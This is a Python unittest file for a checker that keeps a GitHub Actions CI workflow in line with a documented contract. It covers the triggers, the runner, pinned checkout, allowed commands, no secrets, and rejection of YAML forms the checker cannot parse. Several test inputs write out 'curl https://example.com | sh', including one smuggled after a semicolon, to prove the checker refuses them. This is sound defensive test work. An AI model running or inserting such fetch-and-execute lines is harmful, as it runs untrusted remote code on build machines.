"""Tests for scripts/check_ci_workflow.py, run on good and bad sample workflows (written under the project's scratch folder,
removed afterwards) and on the real workflow and doc.

  python -I -B scripts/test_check_ci_workflow.py -v

BS_CI_CHECK_SCRIPT=<path> runs the same tests against another copy of the script (used to prove the tests can fail).
"""
import sys

sys.dont_write_bytecode = True

import importlib.util
import os
import pathlib
import shutil
import unittest
import uuid

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
SCRIPT = pathlib.Path(os.environ.get("BS_CI_CHECK_SCRIPT") or HERE / "check_ci_workflow.py")
SCRATCH = ROOT / "scratch"

spec = importlib.util.spec_from_file_location("check_ci_workflow", SCRIPT)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"

DOC = """# Node 0.1

- ci-triggers: push, pull_request
- ci-runner: windows-latest
- ci-build: cargo build --locked -p broadsword
- ci-test: cargo test --locked -p broadsword
- ci-checkout: actions/checkout pinned to a 40-character commit SHA
"""

GOOD = f"""# comment
name: ci

on:
  push:
  pull_request:

permissions:
  contents: read

jobs:
  build-test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@{SHA} # v4.2.2
      - name: Build
        run: cargo build --locked -p broadsword
      - name: Test
        run: cargo test --locked -p broadsword
"""


def problems(text, doc=DOC):
    return mod.check(text, mod.read_contract(doc))


class Check(unittest.TestCase):
    def test_good_file_is_ok(self):
        self.assertEqual(problems(GOOD), [])

    def test_missing_pull_request_trigger(self):
        p = problems(GOOD.replace("  pull_request:\n", ""))
        self.assertTrue(any("triggers are" in x for x in p), p)

    def test_extra_trigger(self):
        p = problems(GOOD.replace("  push:\n", "  push:\n  schedule:\n"))
        self.assertTrue(any("triggers are" in x for x in p), p)

    def test_branch_limited_push(self):
        p = problems(GOOD.replace("  push:\n", "  push:\n    branches: [main]\n"))
        self.assertTrue(any("limit branches" in x for x in p), p)

    def test_inline_trigger_list(self):
        p = problems(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, pull_request]\n"))
        self.assertEqual(p, [])

    def test_wrong_runner(self):
        p = problems(GOOD.replace("windows-latest", "ubuntu-latest"))
        self.assertTrue(any("runs-on is ubuntu-latest" in x for x in p), p)

    def test_test_command_drift(self):
        p = problems(GOOD.replace("cargo test --locked -p broadsword", "cargo test"))
        self.assertTrue(any("documented test command" in x for x in p), p)
        self.assertTrue(any("unexpected run line" in x for x in p), p)

    def test_doc_drift_is_caught(self):
        p = problems(GOOD, DOC.replace("windows-latest", "macos-latest"))
        self.assertTrue(any("runs-on is windows-latest" in x for x in p), p)

    def test_extra_run_line(self):
        p = problems(GOOD + "      - run: curl https://example.com | sh\n")
        self.assertTrue(any("unexpected run line" in x for x in p), p)

    def test_unpinned_checkout(self):
        p = problems(GOOD.replace(SHA, "v4"))
        self.assertTrue(any("full 40-character" in x for x in p), p)

    def test_third_party_action(self):
        p = problems(GOOD + "      - uses: some/action@" + SHA + "\n")
        self.assertTrue(any("only actions/checkout" in x for x in p), p)

    def test_no_checkout(self):
        p = problems(GOOD.replace(f"      - uses: actions/checkout@{SHA} # v4.2.2\n", ""))
        self.assertTrue(any("no actions/checkout" in x for x in p), p)

    def test_secret_mention(self):
        p = problems(GOOD + "        env:\n          K: ${{ secrets.KEY }}\n")
        self.assertTrue(any("secrets" in x for x in p), p)

    def test_comment_mentioning_secrets_is_fine(self):
        self.assertEqual(problems(GOOD.replace("name: ci", "name: ci # no secrets. here")), [])


    # fail-closed forms the line-based checker cannot read (each must be refused)
    def refused(self, text, word):
        p = problems(text)
        self.assertTrue(any(word in x for x in p), p)

    def test_flow_push_with_branches(self):
        self.refused(GOOD.replace("  push:\n", "  push: {branches: [main]}\n"), "flow-style")

    def test_flow_push_with_tags(self):
        self.refused(GOOD.replace("  push:\n", "  push: { tags: ['v*'] }\n"), "flow-style")

    def test_flow_empty_push(self):
        self.refused(GOOD.replace("  push:\n", "  push: {}\n"), "flow-style")

    def test_flow_list_under_push(self):
        self.refused(GOOD.replace("  push:\n", "  push:\n    branches: [main]\n"), "flow-style")

    def test_whole_on_as_flow_mapping(self):
        self.refused(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: {push: {branches: [main]}, pull_request: {}}\n"), "flow-style `on:`")

    def test_on_child_line_is_flow_mapping(self):
        self.refused(GOOD.replace("  push:\n  pull_request:\n", "  {push: {branches: [main]}}\n"), "flow-style")

    def test_inline_list_with_nested_brackets(self):
        self.refused(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, {pull_request: {branches: [main]}}]\n"), "flow-style `on:`")

    def test_inline_flat_list_allowed(self):
        self.assertEqual(problems(GOOD.replace("on:\n  push:\n  pull_request:\n", "on: [push, pull_request] # ok\n")), [])

    def test_anchor(self):
        self.refused(GOOD.replace("  push:\n", "  push: &p\n"), "anchor or alias")

    def test_alias(self):
        self.refused(GOOD.replace("  pull_request:\n", "  pull_request: *p\n"), "anchor or alias")

    def test_alias_on_a_line_with_an_expression(self):
        self.refused(GOOD + "        env: ${{ github.sha }} *p\n", "anchor or alias")

    def test_merge_key(self):
        self.refused(GOOD + "      - <<: *base\n", "merge key")

    def test_multi_document(self):
        self.refused(GOOD + "---\nname: second\non:\n  push:\n    branches: [x]\n", "document marker")

    def test_leading_document_marker(self):
        self.refused("---\n" + GOOD, "document marker")

    def test_document_end_marker(self):
        self.refused(GOOD + "...\n", "document marker")

    def test_two_on_keys(self):
        self.refused(GOOD + "on:\n  push:\n", "top-level `on:` keys")

    def test_flow_style_step_uses(self):
        self.refused(GOOD + "      - {uses: some/action@v1}\n", "flow-style")

    def test_flow_style_step_run(self):
        self.refused(GOOD + "      - {run: curl https://example.com | sh}\n", "flow-style")

    def test_flow_style_steps_value(self):
        self.refused(GOOD.replace("    steps:\n", "    steps: [{run: id}]\n"), "flow-style")

    def test_quoted_key_run(self):
        self.refused(GOOD + "      - \"run\": curl https://example.com | sh\n", "quoted YAML key")

    def test_space_before_colon_uses(self):
        self.refused(GOOD + "      - uses : some/action@v1\n", "only actions/checkout is allowed")

    def test_space_before_colon_run(self):
        self.refused(GOOD + "      - run : curl https://example.com | sh\n", "unexpected run line")

    def test_space_before_colon_runs_on(self):
        self.refused(GOOD.replace("runs-on: windows-latest", "runs-on : ubuntu-latest"), "runs-on is")

    def test_space_before_colon_on_trigger(self):
        self.refused(GOOD.replace("  pull_request:\n", "  pull_request :\n  schedule :\n"), "triggers are")

    def test_space_before_colon_branches_filter(self):
        self.refused(GOOD.replace("  push:\n", "  push:\n    branches : [main]\n"), "limit branches")

    def test_quoted_key_uses_double(self):
        self.refused(GOOD + "      - \"uses\": some/action@v1\n", "quoted YAML key")

    def test_quoted_key_run_single(self):
        self.refused(GOOD + "      - 'run': curl https://example.com | sh\n", "quoted YAML key")

    def test_quoted_key_with_space_before_colon(self):
        self.refused(GOOD + "      - \"uses\" : some/action@v1\n", "quoted YAML key")

    def test_flow_mapping_step_with_space(self):
        self.refused(GOOD + "      - { uses : some/action@v1 }\n", "flow-style")

    def test_explicit_key_form(self):
        self.refused(GOOD + "      - ? run\n        : curl https://example.com | sh\n", "unrecognised form")

    def test_tagged_key(self):
        self.refused(GOOD + "      - !!str run: curl https://example.com | sh\n", "unrecognised form")

    def test_unclassifiable_line_in_steps(self):
        self.refused(GOOD + "      - just a bare scalar step\n", "unrecognised form")

    def test_unclassifiable_continuation_in_steps(self):
        self.refused(GOOD + "        stray words without a key\n", "unrecognised form")

    def test_block_scalar_body_in_steps_is_not_refused(self):
        ok = GOOD.replace("        run: cargo test --locked -p broadsword\n",
                          "        run: cargo test --locked -p broadsword\n      - name: |\n          words: with a colon\n          and a bare line\n        env:\n          K: v\n")
        self.assertIn("name: |", ok)
        self.assertFalse(any("unrecognised form" in x for x in problems(ok)), problems(ok))

    def test_quoted_run_continues_onto_next_line_double(self):
        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          zz: x"'), "unrecognised form")

    def test_quoted_run_continuation_runs_extra_command(self):
        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", 'run: "cargo test --locked -p broadsword\n          ok: ; curl https://example.com | sh"'), "unrecognised form")

    def test_quoted_run_continues_onto_next_line_single(self):
        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: 'cargo test --locked -p broadsword\n          zz: x'"), "unrecognised form")

    def test_plain_run_continuation_inside_steps(self):
        self.refused(GOOD.replace("run: cargo test --locked -p broadsword", "run: cargo test --locked -p broadsword\n          zz: x"), "unrecognised form")

    def test_quoted_scalar_closed_on_its_own_line_is_fine(self):
        ok = GOOD.replace("      - name: Build\n", '      - name: "Build \\" it"\n').replace("      - name: Test\n", "      - name: 'It''s a test'\n")
        self.assertIn("It''s", ok)
        self.assertEqual(problems(ok), [])

    def test_expression_braces_are_not_flow(self):
        self.assertEqual(problems(GOOD.replace("        run: cargo build", "        env:\n          K: ${{ github.sha }}\n        run: cargo build")), [])

    def test_paths_filter_refused(self):
        p = problems(GOOD.replace("  pull_request:\n", "  pull_request:\n    paths:\n      - src/**\n"))
        self.assertTrue(any("limit branches, tags or paths" in x for x in p), p)


class Cli(unittest.TestCase):
    def setUp(self):
        SCRATCH.mkdir(exist_ok=True)
        self.dir = SCRATCH / f"ci-check-test-{uuid.uuid4().hex[:8]}"
        self.dir.mkdir()
        self.addCleanup(shutil.rmtree, self.dir, True)

    def run_main(self, workflow, doc):
        w, d = self.dir / "ci.yml", self.dir / "0.1.md"
        if workflow is not None:
            w.write_text(workflow, encoding="utf-8")
        if doc is not None:
            d.write_text(doc, encoding="utf-8")
        old = sys.argv
        sys.argv = ["check_ci_workflow.py", "--workflow", str(w), "--doc", str(d)]
        try:
            return mod.main()
        finally:
            sys.argv = old

    def test_good_exits_0(self):
        self.assertEqual(self.run_main(GOOD, DOC), 0)

    def test_bad_exits_1(self):
        self.assertEqual(self.run_main(GOOD.replace("windows-latest", "ubuntu-latest"), DOC), 1)

    def test_missing_file_exits_2(self):
        self.assertEqual(self.run_main(None, DOC), 2)

    def test_doc_without_contract_exits_2(self):
        self.assertEqual(self.run_main(GOOD, "# nothing\n"), 2)


class RealFiles(unittest.TestCase):
    def test_real_workflow_matches_real_doc(self):
        w = ROOT / ".github" / "workflows" / "ci.yml"
        d = ROOT / "docs" / "nodes" / "0.1.md"
        self.assertTrue(w.is_file() and d.is_file())
        self.assertEqual(mod.check(w.read_text(encoding="utf-8"), mod.read_contract(d.read_text(encoding="utf-8"))), [])


if __name__ == "__main__":
    unittest.main()
